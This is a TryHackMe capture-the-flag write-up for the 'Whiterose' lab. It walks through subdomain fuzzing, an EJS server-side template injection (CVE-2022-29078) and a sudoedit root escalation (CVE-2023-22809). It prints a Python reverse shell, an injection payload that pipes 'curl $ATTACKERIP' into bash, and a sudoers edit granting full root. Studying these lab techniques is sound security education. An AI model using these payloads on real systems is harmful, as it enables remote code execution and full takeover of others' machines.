---
title: 'TryHackMe: Whiterose'
author: batu7x
categories: [TryHackMe CTFs]
tags: [web, vhost, subdomain, fuzz, ejs, sudo, ssti, sudoedit]
render_with_liquid: false
media_subpath: /images/tryhackme_whiterose/
image:
  path: room.webp
---

![whiterose](whiterose.webp){: width="1200" height="600" }

## Enumeration

### Nmap Scan

```console
$ sudo nmap -Pn -sC -sV -vv -p- 10.10.35.45

Nmap scan report for 10.10.110.0
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
|_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port **80** & **20** are open, ssh & http.

### Website

Firstly lets check the website, to check the website we need to add target ip to /etc/hosts with domain "cyprusbank.thm"

```console
10.10.110.0 cyprusbank.thm
```
{: file=/etc/hosts}

Saw an under maintenance page, tried to bruteforce directories with gobuster but nothing on it.
Lets enumerate subdomains with ***ffuf*** tool

```console
ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -t 100 -ic -fw 1
```

![FFUF_0](ffuf0.webp){: width="1200" height="600" }

## Shell

### Web Shell

We will check **admin.cyprusbank.thm** Before we check the website again, add the admin.cyprusbank.thm to /etc/hosts file

```console
10.10.110.0 admin.cyprusbank.thm
```
{: file=/etc/hosts}

![FFUF_1](ffuf1.webp){: width="1200" height="600" }

Login the panel with the credentials they gave us `Olivia Cortez:olivi8`

Checking /messages page, we can see a chat is there.

![FFUF_2](ffuf2.webp){: width="1200" height="600" }

We will edit the `c` parameter's value in the URL. `c` parameter used to count of messages displayed.

We editing the value of the parameter: `http://admin.cyprusbank.thm/messages/?c=10` Now we see old messages.

![FFUF_3](ffuf3.webp){: width="1200" height="600" }

Now login to Gayle Bev's account. After logging into Gayle Bev's account, we got access to `/settings` page & phone numbers.

Here we got Tyrell Wellick's phone number

`/settings` page allow us to change the password of customers. Now we will Fuzz for any other parameters in `/settings`.

```console
ffuf -u 'http://admin.cyprusbank.thm/settings' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: connect.sid=s%3A963nX9s4XuaLZ6JKRqNZYl0NV8KcmG9M.jPobOtURlr8AXjDKhd2b4n79%2F%2Bw8Wea1axI%2F6Ak1ut8' -mc all -d 'name=abc&password=abc&FUZZ=abc' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 2097
```

![FFUF_4](ffuf4.webp){: width="1200" height="600" }

`Client` & `include` parameters return a 500 response with error.

![FFUF_5](ffuf5.webp){: width="1200" height="600" }

From 500 Response we learnt it uses EJS engine. EJS have server side template injection CVE-2022-29078 we will use this vulnerability in this CTF.

We create an `index.html` file in our attacker machine and put python reverse shell in it

```console
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKERIP",$ATTACKERPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
{: .wrap }

And host a http server in the directory with `index.html` file

```console
python3 -m http.server 80
```
{: .wrap }

Send a request with our server side template injection payload

```console
settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl $ATTACKERIP|bash');s
```
{: .wrap }

![FFUF_7](ffuf7.webp){: width="1200" height="600" }

We got our shell with the user: web, user.txt is in the home directory! After that lets move to privilege escalation.

### Root Shell

Firstly we will check the sudo privileges

```console
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

We can sudoedit on a file with root privileges. This sudoedit version got `CVE-2023–22809` privilege escalation vulnerability. Lets start escalation:

First we need to select editor & use sudoedit

```console
export EDITOR="nano -- /etc/sudoers"
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

This commands open the file in nano text editor. Add this line to the file & save.

```console
web ALL=(ALL:ALL) NOPASSWD: ALL
```

After that we grant full sudo privilege. Lets change the user to root

```console
sudo su
```

We got our shell as root and read the file at /root/root.txt

![FFUF_6](ffuf6.webp){: width="1200" height="600" }

Thanks for reading, happy hacking!

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>